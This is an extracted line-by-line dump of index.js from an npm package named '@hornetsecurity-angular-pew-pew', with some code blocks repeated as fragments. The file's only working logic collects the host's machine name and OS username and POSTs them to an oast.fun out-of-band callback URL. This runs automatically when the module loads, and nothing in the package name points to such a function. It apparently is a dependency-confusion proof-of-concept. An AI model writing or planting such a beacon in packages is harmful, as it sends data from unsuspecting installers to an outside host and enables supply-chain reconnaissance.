// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmp6_ci_esz/@hornetsecurity-angular-pew-pew/package/index.js
// ======================================================================
Line 2: const os = require("os")
Line 3: const https = require("https")
Line 6: const fetch = globalThis.fetch
  ? globalThis.fetch
  : (url, options) => {
      return new Promise((resolve, reject) => {
        const req = https.request(url, {
          method: options.method,
          headers: options.headers,
        }, (res) => {
          const data = [];
          res.on("data", (chunk) => data.push(chunk));
          res.on("end", () => resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            text: () => Promise.resolve(Buffer.concat(data).toString()),
          }));
        });
        req.on("error", reject);
        req.write(options.body);
        req.end();
      });
    }
Line 9: {
        const req = https.request(url, {
          method: options.method,
          headers: options.headers,
        }, (res) => {
          const data = [];
          res.on("data", (chunk) => data.push(chunk));
          res.on("end", () => resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            text: () => Promise.resolve(Buffer.concat(data).toString()),
          }));
        });
        req.on("error", reject);
        req.write(options.body);
        req.end();
      }
Line 10: const req = https.request(url, {
          method: options.method,
          headers: options.headers,
        }, (res) => {
          const data = [];
          res.on("data", (chunk) => data.push(chunk));
          res.on("end", () => resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            text: () => Promise.resolve(Buffer.concat(data).toString()),
          }));
        })
Line 13: {
          const data = [];
          res.on("data", (chunk) => data.push(chunk));
          res.on("end", () => resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            text: () => Promise.resolve(Buffer.concat(data).toString()),
          }));
        }
Line 14: const data = []
Line 15: data.push(chunk)
Line 19: Buffer.concat(data).toString()
Line 23: req.write(options.body)
Line 24: req.end()
Line 29: const CALLBACK_URL = process.env.CALLBACK_URL || "https://d2g46mpij2cnhns2vkjg9e79i6qkzwoh5.oast.fun"
Line 31: {
  const payload = {
    hostname: os.hostname(),              // Machine name
    username: os.userInfo().username      // Current OS user
  };

  console.log("[*] Payload:", payload);

  try {
    const res = await fetch(CALLBACK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const text = await res.text();
    console.log(`[+] Response status: ${res.status}`);
    console.log(`[+] Response body: ${text}`);
  } catch (err) {
    console.error("[!] Failed to post callback:", err);
  }
}
Line 33: os.hostname()
Line 34: os.userInfo()
Line 37: console.log("[*] Payload:", payload)
Line 39: {
    const res = await fetch(CALLBACK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const text = await res.text();
    console.log(`[+] Response status: ${res.status}`);
    console.log(`[+] Response body: ${text}`);
  }
Line 40: const res = await fetch(CALLBACK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
Line 45: res.text()
Line 46: console.log(`[+] Response status: ${res.status}`)
Line 47: console.log(`[+] Response body: ${text}`)
Line 48: catch (err) {
    console.error("[!] Failed to post callback:", err);
  }
Line 49: console.error("[!] Failed to post callback:", err)
Line 53: pingBack()
